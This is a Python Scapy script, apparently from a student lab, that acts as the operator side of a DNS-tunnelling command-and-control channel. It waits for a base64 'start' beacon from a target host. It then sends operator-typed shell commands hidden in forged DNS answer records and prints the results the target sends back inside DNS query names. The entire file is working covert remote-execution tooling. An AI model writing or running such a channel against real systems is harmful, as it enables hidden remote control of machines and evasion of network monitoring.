####### Import libraries
from scapy.all import *
import base64
import sys

MYIP="MYIP"

def add_domain_padding():
	return ".telecomparis.fr"

def reverse_domain_padding(message):
	return message.split(b'.')[0]

def decode_b64(message):
	query_b64_bytes=base64.b64decode(message)
	return query_b64_bytes.decode('ascii')
	

def encode_b64(message):
	query_bytes=message.encode('ascii')
	query_b64_bytes=base64.b64encode(query_bytes)
	return query_b64_bytes.decode('ascii')


### choose trafic to sniff, lambda function
def choose_trafic(pkt):
	if(IP in pkt):
		return (pkt['IP'].src == "192.168.10.4")
	else:
		return False

###sniff incomming traffic on port 53

def listen_to_trafic(port,IP):
	pkts=sniff(lfilter=choose_trafic)
	return pkts


def wait_for_conn(pkt):
	for paquet in pkt:
		if(UDP in paquet):
			if(paquet.haslayer(DNS)):
				query=paquet['DNSQR'].qname
				print(query)
				query=reverse_domain_padding(query)

				#query=query.decode('utf-8')[:-1]
				if(decode_b64(query)=="start"):
					return True
	return False





if __name__ == "__main__":
	conn=False
	cont=True
	first=sys.argv[1]
	if first == '1':	
		while(not conn):
			pkts=sniff(iface="eth0",lfilter=choose_trafic,count=1)
			conn=wait_for_conn(pkts)
	while(cont):
		payload1=input("Quelle commande voulez vous executer sur la machine ?('stop' pour arreter)")
		if payload1=='stop':
			cont=False
			break
		payload2=input("avec quel argument ?")
		payload = encode_b64(payload1)+'&'+encode_b64(payload2)
		print(payload)
		paquet2=IP(src="192.168.20.4",dst="192.168.10.4")/UDP(dport=10000)/DNS(qr=1,rd=1,ra=1,qdcount=1,ancount=1,qd=DNSQR(qname='telecomparis.fr'),an=DNSRR(rrname=payload+add_domain_padding(),rdata="8.8.8.8"))
		send(paquet2)
		rcv=True
		while(rcv):
			pkts=sniff(iface="eth0",lfilter=choose_trafic,count=1)
			for paquet in pkts:
				#print(paquet.summary())
				if (UDP in paquet):
					if (paquet.haslayer(DNS)):
						query=paquet['DNSQR'].qname
						query=reverse_domain_padding(query)
						query=decode_b64(query)
						#print(query.decode('utf-8')[:-1])
						if(query=="stop"):
							rcv=False
						else : 
							print(query,end ='')




